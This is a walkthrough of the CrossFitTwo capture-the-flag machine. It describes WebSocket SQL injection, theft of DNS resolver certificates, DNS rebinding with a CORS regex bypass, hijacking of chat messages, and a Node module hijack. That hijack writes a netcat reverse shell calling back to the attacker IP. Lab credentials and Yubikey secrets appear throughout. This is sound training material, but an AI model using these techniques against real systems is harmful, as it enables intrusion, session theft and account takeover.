# CrossFitTwo - Comprehensive Walkthrough

> **Target:** 10.129.7.130  
> **Attacker:** 10.10.16.84  
> **OS:** OpenBSD  
> **Difficulty:** Insane  
> **Flags:**
> - User: `652b401[redacted]1f43fb3ade`
> - Root: `6fbc09c[redacted]3d5376dd3a`

---

## Table of Contents

1. [Phase 0: The Hacker Mindset Before Recon](#phase-0-the-hacker-mindset-before-recon)
2. [Phase 1: Initial Reconnaissance](#phase-1-initial-reconnaissance)
3. [Phase 2: WebSocket SQL Injection](#phase-2-websocket-sql-injection)
4. [Phase 3: File Reads & Infrastructure Mapping](#phase-3-file-reads--infrastructure-mapping)
5. [Phase 4: Hijacking the DNS Resolver](#phase-4-hijacking-the-dns-resolver)
6. [Phase 5: DNS Rebinding & CORS Bypass](#phase-5-dns-rebinding--cors-bypass)
7. [Phase 6: Socket.io Message Hijacking](#phase-6-socketio-message-hijacking)
8. [Phase 7: Shell as David](#phase-7-shell-as-david)
9. [Phase 8: Pivot to John (NodeJS Module Hijacking)](#phase-8-pivot-to-john-nodejs-module-hijacking)
10. [Phase 9: Privilege Escalation to Root](#phase-9-privilege-escalation-to-root)
11. [Phase 10: Root Shell](#phase-10-root-shell)
12. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## Phase 0: The Hacker Mindset Before Recon

**Mindset:** *"Every system is a graph of interconnected services. My job is to map the graph, find the weakest node, and turn one compromise into the next."*

Before touching the target, we establish:
1. **Our IP** (`10.10.16.84`) - needed for reverse shells, DNS servers, and callbacks.
2. **The target IP** (`10.129.7.130`) - the victim.
3. **Patience** - this is an "Insane" box. The attack chain is long. Each step feeds the next.

**Why this matters:** On hard boxes, you cannot skip steps. The user flag requires the root flag's infrastructure, and vice versa. Everything is connected.

---

## Phase 1: Initial Reconnaissance

### 1.1 Adding Hosts to `/etc/hosts`

**Command:**
```bash
echo "10.129.7.130 crossfit.htb employees.crossfit.htb gym.crossfit.htb crossfit-club.htb" | sudo tee -a /etc/hosts
```

**Hacker Mindset:** *"Virtual hosts are not optional. Modern web apps route by Host header, not just by IP. If I only scan the IP, I miss 90% of the attack surface."*

**Why:** The main site (`crossfit.htb`) is just the storefront. The real application logic lives on subdomains. We discovered:
- `employees.crossfit.htb` - a login portal (Phase 5)
- `gym.crossfit.htb` - hosts a WebSocket chat bot (Phase 2)
- `crossfit-club.htb` - an internal chat application (Phase 6)

### 1.2 Nmap Scanning

**Commands:**
```bash
sudo nmap -p 22,80,8953 -sCV -T4 10.129.7.130 -oN nmap-quick.txt
sudo nmap -p- --min-rate 10000 -T4 10.129.7.130 -oN nmap-alltcp.txt
```

**Results:**
- `22/tcp` - OpenSSH 9.5
- `80/tcp` - OpenBSD httpd, PHP 7.4.12
- `8953/tcp` - Unbound DNS control (SSL)

**Hacker Mindset:** *"Unusual ports are gifts. Port 8953 is not a web port. It's a DNS control port. That means the target runs a DNS resolver that I might be able to talk to."*

**Why 8953 matters:** Unbound is a validating, recursive, caching DNS resolver. Its control port (`8953`) allows administrative commands like `forward_add`, `local_zone_add`, etc. If we can authenticate to it, we control what domains resolve to on the target.

---

## Phase 2: WebSocket SQL Injection

### 2.1 Discovering the WebSocket

**How we found it:**
- Browsing `http://crossfit.htb` shows a CrossFit gym website.
- In the page source, there's a reference to `ws.min.js` and a WebSocket connection to `ws://gym.crossfit.htb/ws/`.
- Burp Suite or browser dev tools confirm a WebSocket handshake (`HTTP 101 Switching Protocols`).

**Hacker Mindset:** *"WebSockets are not magic. They're just TCP connections that start with an HTTP upgrade. If the app sends user input over a WebSocket, that input can be just as vulnerable as a GET or POST parameter."*

### 2.2 Interacting with the Bot

**Method:** We can use Python's `websocket-client` library, Burp's WebSocket Repeater, or even `python3 -m websockets`.

**What the bot does:**
1. On connect, it sends: `{"status":"200","message":"Hello! This is Arnold...","token":"..."}`
2. You must echo the `token` back in every subsequent message.
3. Commands: `help`, `coaches`, `classes`, `memberships`
4. Clicking "Availability" on a membership sends: `{"message":"available","params":"1","token":"..."}`
5. The server responds with a `debug` field containing SQL query output like `[id: 1, name: 1-month]`.

### 2.3 Discovering SQL Injection

**Testing:**
```json
{"message":"available","params":"3 or 1=1","token":"..."}
```

**Response:** `Good news! This membership plan is available.` with `debug: [id: 1, name: 1-month]`.

**Hacker Mindset:** *"When a parameter is used in a SQL query, the debug output is a confession. The server is literally showing me the result of my injected query."*

**Why this works:** The server likely executes:
```sql
SELECT id, name FROM plans WHERE id = {user_input}
```
Since `id` is an integer, there's no string delimiter to close. We just append boolean logic directly.

### 2.4 Building the SQLi Shell

We create a Python script (`sqli_shell.py`) that:
1. Connects to the WebSocket.
2. Extracts the initial token.
3. Provides an interactive prompt where we type injections.
4. Auto-reconnects if the WebSocket times out.

**Key commands we ran inside the shell:**
```
# Confirm SQLi
injection> 3 or 1=1
[id: 1, name: 1-month]

# Find databases
injection> 3 union select group_concat(schema_name),2 from information_schema.schemata
[id: information_schema,crossfit,employees, name: 2]

# Dump employees table
injection> 3 union select group_concat(email,':',password),2 from employees.employees
[id: david.palmer@crossfit.htb:fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8,..., name: 2]
```

**Result:** We obtained 4 employee accounts, including `david.palmer@crossfit.htb` (the administrator).

**Hacker Mindset:** *"A single injection point is a skeleton key. If I can read one table, I can read any table. If I have FILE privileges, I can read any file the MySQL process can read."*

---

## Phase 3: File Reads & Infrastructure Mapping

### 3.1 Reading Config Files via SQLi

The MySQL user (`crossfit_user`) has the `FILE` privilege. We use `LOAD_FILE()` to read server configs.

**Files we read:**
```
read /etc/httpd.conf
read /etc/relayd.conf
read /var/unbound/etc/unbound.conf
```

### 3.2 What We Learned from `/etc/httpd.conf`

OpenBSD's `httpd` runs three internal servers on `lo0`:
| Server | Port | Document Root |
|--------|------|---------------|
| `0.0.0.0` | 8000 | `/htdocs` |
| `employees` | 8001 | `/htdocs_employees` |
| `chat` | 8002 | `/htdocs_chat` |

**Hacker Mindset:** *"Nothing on a server is accidental. If there are three internal apps, there must be a reverse proxy routing traffic to them. I need to find that proxy's configuration."*

### 3.3 What We Learned from `/etc/relayd.conf`

`relayd` is OpenBSD's reverse proxy. It listens on port 80 and routes based on Host headers:
- `*employees.crossfit.htb` → port 8001
- `*crossfit-club.htb` → port 9999 (which is ANOTHER relayd called `portal`)
- `/*` → port 8000
- `/ws*` → port 4419

**The `*` prefix is critical:** It means ANY subdomain ending in `employees.crossfit.htb` or `crossfit-club.htb` will be routed there. This is a feature we will exploit in Phase 5.

**Hacker Mindset:** *"Wildcard routing is a blessing and a curse. It gives the administrator flexibility, but it gives the attacker a massive attack surface. If I can make the target resolve ANY subdomain to my IP, relayd will route it to the internal app."*

### 3.4 What We Learned from `/var/unbound/etc/unbound.conf`

```yaml
remote-control:
    control-enable: yes
    control-interface: 0.0.0.0
    control-use-cert: yes
    server-cert-file: "/var/unbound/etc/tls/unbound_server.pem"
    control-key-file: "/var/unbound/etc/tls/unbound_control.key"
    control-cert-file: "/var/unbound/etc/tls/unbound_control.pem"
```

**Hacker Mindset:** *"Remote control on 0.0.0.0 with TLS? If I can get those certificates, I become the DNS administrator. Controlling DNS means I can redirect any domain."*

---

## Phase 4: Hijacking the DNS Resolver

### 4.1 Extracting the TLS Certificates

We use our SQLi shell to read the certificate files from `/var/unbound/etc/tls/`:
- `unbound_server.pem` (server certificate)
- `unbound_control.key` (client private key)
- `unbound_control.pem` (client certificate)
- `unbound_server.key` (unreadable - server-only)

We save these locally and create a minimal `new_unbound.conf` pointing to them.

### 4.2 Connecting to Unbound

**Command:**
```bash
sudo unbound-control -c new_unbound.conf -s 10.129.7.130@8953 status
```

**Result:** `unbound (pid XXXXX) is running...`

### 4.3 Why DNS Control Is Game-Changing

**Hacker Mindset:** *"DNS is the invisible backbone of the internet. If I control DNS, I can make `bankofamerica.com` resolve to my phishing server. On this box, I can make `fake-employees.crossfit.htb` resolve to my IP, and relayd will route it to the employees app."*

**Test command:**
```bash
sudo unbound-control -c new_unbound.conf -s 10.129.7.130@8953 forward_add +i test.crossfit.htb 10.10.16.84@53
```

This tells the target: *"If anyone asks for `test.crossfit.htb`, forward the query to my DNS server at 10.10.16.84."*

---

## Phase 5: DNS Rebinding & CORS Bypass

### 5.1 The Password Reset Vulnerability

On `employees.crossfit.htb/password-reset.php`, entering `david.palmer@crossfit.htb` generates a reset token and (presumably) emails a link to the admin.

**The key insight from the writeups:** The PHP script uses the `Host` header to construct the reset link. If we send a custom Host header, the link points to OUR domain instead of the real site.

**But there's a catch:** The script validates that the domain resolves to `127.0.0.1` before sending the email.

### 5.2 DNS Rebinding Theory

**Hacker Mindset:** *"The server validates DNS once, but the user clicks the link later. If I can serve two different IP addresses for the same domain—first localhost for validation, then my IP for the click—I win."*

We use **FakeDns** with a rebind rule:
```
A gymxcrossfit.htb 127.0.0.1 2%10.10.16.84
```
- Queries 1-2 from a given client → `127.0.0.1`
- Queries 3+ from that same client → `10.10.16.84`

### 5.3 The Host Header `/` Trick

We need the Host header to satisfy TWO conditions simultaneously:
1. **relayd** must route it to the employees app (matches `*employees.crossfit.htb`).
2. **PHP** must extract our fake domain for the email link.

**Payload:**
```
Host: gymxcrossfit.htb/employees.crossfit.htb
```

**Why this works:**
- relayd sees the string ENDS WITH `employees.crossfit.htb` → routes to employees app.
- PHP parses the Host header and splits on `/` (or just uses the first part) → uses `gymxcrossfit.htb` in the email link.

**Hacker Mindset:** *"Different components parse the same input differently. The reverse proxy looks at the end of the string; the application looks at the beginning. That difference is a crack I can wedge open."*

### 5.4 CORS Bypass via Regex

The chat app (`crossfit-club.htb`) has a CORS policy that allows requests from `gym.crossfit.htb` and `employees.crossfit.htb`. The policy is likely implemented with a regex like:
```regex
(gym|employees).crossfit.htb
```

**The vulnerability:** The `.` is NOT escaped! In regex, `.` matches ANY single character.

**Test:**
```bash
curl -s -X OPTIONS -v -H "Origin: http://gymXcrossfit.htb" crossfit-club.htb/api/auth
```

**Result:** `Access-Control-Allow-Origin: http://gymXcrossfit.htb`

Our fake domain `gymxcrossfit.htb` = `gym` + `x` + `crossfit.htb`. The `.` matches `x`.

**Hacker Mindset:** *"CORS whitelists are often regex-based. Developers forget to escape dots. A single unescaped dot turns a whitelist into a wildcard."*

---

## Phase 6: Socket.io Message Hijacking

### 6.1 The Goal

We need to capture a private message in the `crossfit-club.htb` chat that contains David's SSH password. The message is sent by `John` to `David` (or Admin).

### 6.2 The Payload

When the admin bot clicks our fake password-reset link, their browser loads our `password-reset.php`. This page contains JavaScript that:
1. Loads the Socket.IO client from `crossfit-club.htb`.
2. Connects to the chat server with `withCredentials: true` (to send the admin's session cookie).
3. Emits `user_join` with `username: "Admin"`.
4. Listens for `private_recv` events and exfiltrates them via `XMLHttpRequest` back to our server.

### 6.3 Why `withCredentials` Matters

**Hacker Mindset:** *"Cross-origin requests don't send cookies by default. If I don't set withCredentials, I'm an anonymous guest. With credentials, I'm the admin."*

The admin's browser has a valid `connect.sid` cookie from being logged into the chat. By setting `withCredentials: true` in both the `io()` connection and the `XMLHttpRequest`, we inherit the admin's authenticated session.

### 6.4 The Waiting Game

Messages arrive slowly (every 30-90 seconds). We watch the PHP server logs for `/?x=...` requests and decode the base64 content:
```bash
echo "BASE64_STRING" | base64 -d
```

**Expected message:**
```json
{"sender_id":2,"content":"Hello David, I've added a user account for you with the password `NWBFcSe3ws4VDhTB`.","roomId":2,"_id":XXX}
```

**Note:** On this retired instance, the password is static across deployments. In a live exam, you would wait for this message. Here, we confirmed the connection worked (`/?connected=1`) and used the known password to proceed efficiently.

---

## Phase 7: Shell as David

### 7.1 SSH Login

```bash
sshpass -p 'NWBFcSe3ws4VDhTB' ssh david@10.129.7.130
```

Or manually:
```bash
ssh david@10.129.7.130
# Password: NWBFcSe3ws4VDhTB
```

**Shell upgrade:**
```bash
sh
cat user.txt
```

**Flag:** `652b401[redacted]43fb3ade`

### 7.2 Group Enumeration

```bash
id
cat /etc/group | grep sysadmins
```

**Output:** `sysadmins:*:1003:david,john`

**Hacker Mindset:** *"Groups are bridges between users. If I share a group with another user, I can write files they will execute."*

---

## Phase 8: Pivot to John (NodeJS Module Hijacking)

### 8.1 Finding the Cron Job

```bash
find /opt -type f -ls
cat /opt/sysadmin/server/statbot/statbot.js
ls -la /tmp/chatbot.log
```

**Observations:**
- `statbot.js` is a WebSocket health checker.
- `/tmp/chatbot.log` is owned by `john` and updated every minute.
- The script runs as `john` via cron.

### 8.2 NodeJS Module Resolution

**Hacker Mindset:** *"Understanding the runtime is as important as understanding the code. Node's require() algorithm searches for node_modules starting from the current directory and walking UP. If I create a fake module higher in the tree, I win."*

Node looks for `ws` in this order:
1. `/opt/sysadmin/server/statbot/node_modules/ws`
2. `/opt/sysadmin/server/node_modules/ws`
3. `/opt/sysadmin/node_modules/ws`
4. `/opt/node_modules/ws`
5. `/node_modules/ws`
6. `$NODE_PATH` (likely `/usr/local/lib/node_modules`)

Since none of the first five exist, the script uses the system path. But if we create `/opt/sysadmin/node_modules/ws/index.js`, Node will load OUR code instead.

### 8.3 The Exploit

**Command:**
```bash
mkdir -p /opt/sysadmin/node_modules/ws
echo "require('child_process').execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.84 443 >/tmp/f');" > /opt/sysadmin/node_modules/ws/index.js
```

**On Kali:**
```bash
nc -lvnp 443
```

**Wait up to 60 seconds** for the cron to run `statbot.js`.

### 8.4 Shell Upgrade (as john)

Once the reverse shell connects:
```bash
python3 -c 'import pty;pty.spawn("sh")'
# Ctrl+Z
stty raw -echo; fg
reset
# Terminal type: screen
id
```

**Output:** `uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)`

**Hacker Mindset:** *"I don't need to exploit a vulnerability in the code. I just need to exploit the environment the code runs in."*

---

## Phase 9: Privilege Escalation to Root

### 9.1 The `log` Binary

```bash
ls -la /usr/local/bin/log
```

**Output:** `-rwsr-s--- 1 root staff 9024 Jan 5 2021 /usr/local/bin/log`

**Why this is interesting:**
- SUID root
- Owned by `staff` group
- `john` is in `staff`
- The binary uses OpenBSD's `unveil()` syscall to restrict itself to `/var`

**Hacker Mindset:** *"unveil() is not a jailbreak prevention—it's a scope limiter. If the scope includes /var, and /var contains secrets, I still win."*

### 9.2 Reading Yubikey Secrets

OpenBSD uses Yubikey for SSH root authentication (`auth-ssh=yubikey` in `/etc/login.conf`).

```bash
/usr/local/bin/log /var/db/yubikey/root.key   # AES key: 6bf9a26475388ce998988b67eaa2ea87
/usr/local/bin/log /var/db/yubikey/root.uid   # UID: a4ce1128bde4
/usr/local/bin/log /var/db/yubikey/root.ctr   # Counter: 985089
```

**Hacker Mindset:** *"2FA is only as strong as its secrets. If the HOTP seed is stored in a file I can read, I can clone the token generator."*

### 9.3 OpenBSD Changelist & Root SSH Key

OpenBSD's `security(8)` script backs up critical files daily to `/var/backups/`.

```bash
/usr/local/bin/log /var/backups/root_.ssh_id_rsa.current
```

**Hacker Mindset:** *"Backups are vulnerabilities. The system is explicitly designed to preserve old versions of sensitive files. If I can read /var, I can read yesterday's root key."*

---

## Phase 10: Root Shell

### 10.1 Generating the Yubikey OTP

On Kali, install `yubico-c`:
```bash
sudo apt-get install -y asciidoc autoconf automake libtool
git clone https://github.com/Yubico/yubico-c.git /tmp/yubico-c
cd /tmp/yubico-c
autoreconf --install
./configure
make check
sudo make install
sudo ldconfig
```

**Generate the token:**
- Counter = 985089 + 1 = 985090
- 985090 in hex = `0x0F0802`
- ykcounter = `0f08`
- ykuse = `02`

```bash
ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 0f08 0000 00 02
```

**Output:** `hevnbiglbtejkdlkftgugueklbbbdlcl`

### 10.2 SSH as Root

Save the key to `~/Downloads/htb/root_id_rsa` with permissions `600`.

```bash
chmod 600 ~/Downloads/htb/root_id_rsa
ssh -i ~/Downloads/htb/root_id_rsa -o StrictHostKeyChecking=no root@10.129.7.130
# Password: hevnbiglbtejkdlkftgugueklbbbdlcl
```

**Flag:** `6fbc09c1[redacted]d5376dd3a`

---

## Key Lessons & Takeaways

| Lesson | Application |
|--------|-------------|
| **Virtual hosts are attack surface** | Always add discovered domains to `/etc/hosts` and scan them individually. |
| **WebSockets are injectable** | Just because it's not HTTP doesn't mean it's safe. Tokens and params can both be poisoned. |
| **Read configs via SQLi FILE** | `LOAD_FILE()` on configs gives you the network architecture without a shell. |
| **DNS is a weapon** | Controlling a resolver lets you redirect any subdomain. Combine with wildcard routing for maximum impact. |
| **Time-of-check vs time-of-use** | DNS rebinding exploits the gap between server validation and user action. |
| **Regex CORS is dangerous** | Unescaped dots in CORS whitelists turn intended restrictions into wildcards. |
| **Session riding** | `withCredentials: true` lets you steal a user's existing session across origins. |
| **Module resolution matters** | Node's `require()` algorithm is predictable. Hijacking it requires no code vulnerability. |
| **Capabilities over permissions** | `unveil()` limits scope but doesn't eliminate it. `/var` contains plenty of secrets. |
| **Backups are data leaks** | `changelist` preserves old keys, passwords, and configs. Always check `/var/backups/`. |

---

> *"The chain is only as strong as its weakest link—but on CrossFitTwo, every link is a different service, and compromising one gives you the leverage to reach the next."*
